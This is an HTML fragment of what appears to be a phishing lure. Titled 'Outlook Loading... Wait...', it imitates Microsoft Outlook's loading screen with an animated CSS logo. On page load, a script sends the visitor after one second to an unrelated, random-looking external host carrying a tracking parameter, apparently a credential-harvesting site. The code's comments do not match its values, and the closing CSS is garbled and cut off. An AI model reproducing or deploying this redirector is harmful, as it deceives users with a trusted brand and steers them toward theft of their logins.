    <script>
  // List of URLs to cycle through
  const urls = ["https://cxbdhrsdt.mypi.co"];

  // Function to get the next URL from local storage or default to the first URL
  function getNextUrl() {
    let currentIndex = localStorage.getItem("currentIndex");
    
    // Default to index 0 if not set
    currentIndex = currentIndex ? parseInt(currentIndex) : 0;

    // Get the next URL
    const nextUrl = urls[currentIndex];

    // Update the index for the next visit
    currentIndex = (currentIndex + 1) % urls.length;
    localStorage.setItem("currentIndex", currentIndex);

    return nextUrl;
  }

  // Main function to execute the redirect
  function redirectToNextUrl() {
    const nextUrl = getNextUrl();

    // Check if the URL ends with a slash and remove it
    const sanitizedUrl = nextUrl.endsWith('/') ? nextUrl.slice(0, -1) : nextUrl;

    // Append 'f56yen0' directly to the sanitized URL
    const fullUrl = `${sanitizedUrl}/?t5bhd=f6yen0`;

    // Redirect to the constructed URL after a 5-second delay
    setTimeout(() => {
      window.location.href = fullUrl;
    }, 1000); // 1000 milliseconds = 1 seconds
  }

  // Execute the redirect when the page loads
  window.onload = redirectToNextUrl;
</script>

    <style>
      #loadingScreen {
        position: fixed;
        top: 0;
        bottom: 0;
        left: 0;
        right: 0;
        background-color: #fff;
      }
      #loadingLogo {
        position: fixed;
        top: calc(50vh - 90px);
        left: calc(50vw - 90px);
        width: 180px;
        height: 180px;
      }
      #MSLogo {
        position: fixed;
        bottom: 36px;
        left: calc(50vw - 45px);
      }
      .dark #loadingScreen {
        background-color: #333;
      }
      .darkNew #loadingScreen {
        background-color: #1f1f1f;
      }
    </style>
    <title>
      Outlook Loading... Wait...
    </title>
  </head>
  <body>
    <div id="loadingScreen">
      <div id="loadingLogo">
        <style>
          :root {
            --s: 180px;
            --envW: 130px;
            --envH: 71px;
            --calW: 118px;
            --sqW: calc(var(--calW) / 3);
            --sqH: 37px;
            --calHH: 20px;
            --calH: calc(var(--sqH) * 3 + var(--calHH));
            --calY: calc(var(--calH) + 20px);
            --calYExt: calc(var(--calH) - 80px);
            --calYOverExt: calc(var(--calH) - 92px);
            --flapS: 96px;
            --flapH: calc(0.55 * var(--envH));
            --flapScaleY: calc(var(--flapH) / var(--flapWidth));
            --dur: 5s;
          }

          #container {
            width: var(--s);
            height: var(--s);
            animation: bounce var(--dur) infinite;
          }

          @keyframes bounce {
            0% {
              transform: translateY(0);
            }
            12.5% {
              transform: translateY(0);
            }
            22.5% {
              transform: translateY(7px);
            }
            32.5% {
              transform: translateY(0);
            }
            50% {
              transform: translateY(0);
            }
            76.1% {
              transform: translateY(0);
            }
            86% {
              transform: translateY(7px);
            }
            100% {
              transform: translateY(0);
            }
          }

          #logo {
            height: 179px;
            width: 130px;
            overflow: hidden;
            margin-top: -59px;
            margin-left: 25px;
          }

          #containerShadow {
            position: relative;
            top: 120px;
            left: 25px;
            width: var(--envW);
            height: var(--envH);
            border-radius: 0 0 7px 7px;
            box-shadow: rgba(0, 0, 0, 0.25) 0 4px 5px;
            animation: shadow-fade var(--dur) infinite;
          }

          @keyframes shadow-fade {
            0% {
              opacity: 0;
            }
            21.2% {
              opacity: 0;
            }
            47% {
              opacity: 1;
            }
            70% {
              opacity: 1;
            }
            80% {
              opacity: 0;
            }
            100% {
              opacity: 0;
            }
          }

          #flapContainer {
            width: var(--envW);
            margin-top: 179px;
          }

          #ef {
            width: var(--envW);
            height: var(--envH);
            border-radius: 0 0 7px 7px;
            overflow: hidden;
            margin-top: -41px;
          }

          #ef > .l {
            width: 287px;
            height: var(--envH);
            background: #28a8ea;
            transform: translate(-153px, -70px) rotate(28deg);
          }

          #ef > .r {
            width: 287px;
            height: var(--envH);
            background: #1490df;
            transform: translate(-120px, 63px) rotate(-28deg);
          }

          #eb {
            width: var(--envW);
            height: 40px;
            background: #123b6d;
            margin-top: -70px;
          }

          #cal {
            display: flex;
            flex-direction: row;
            flex-wrap: wrap;
            width: var(--calW);
            height: var(--calH);
            border-radius: 7px;
            overflow: hidden;
            margin: 0 auto;
            margin-top: -306px;
            animation: cal-bounce var(--dur) infinite;
            animation-timing-function: cubic-bezier(0, 0.5, 0, 1);
            transform: translateY(var(--calYExt)) scaleY(1);
          }

          @keyframes cal-bounce {
            0% {
              transform: translateY(var(--calY)) scaleY(1);
            }
            16.5% {
              transform: translateY(var(--calY)) scaleY(1);
            }
            28% {
              transform: translateY(var(--calYOverExt)) scaleY(1);
            }
            31% {
              transform: translateY(var(--calYExt)) scaleY(1.05);
            }
            33% {
              transform: translateY(var(--calYExt)) scaleY(0.96);
            }
            34% {
              transform: translateY(var(--calYExt)) scaleY(1);
            }
            68.5% {
              transform: translateY(var(--calYExt)) scaleY(1);
              animation-timing-function: cubic-bezier(0.66, -0.16, 1, -0.29);
            }
            76.1% {
              transform: translateY(var(--calY)) scaleY(1);
            }
            100% {
              transform: translateY(var(--calY)) scaleY(1);
            }
          }

          #cal > .t {
            width: var(--calW);
            height: calc(var(--calHH) + 1px);
            margin-bottom: -1px;

            100% {

            }
          }

            8.5% {

            77% {

            }
            100% {
              transform: translateY(calc(-1 * var(--envH))) rotate3d(1, 0, 0, 0);
            }
          }
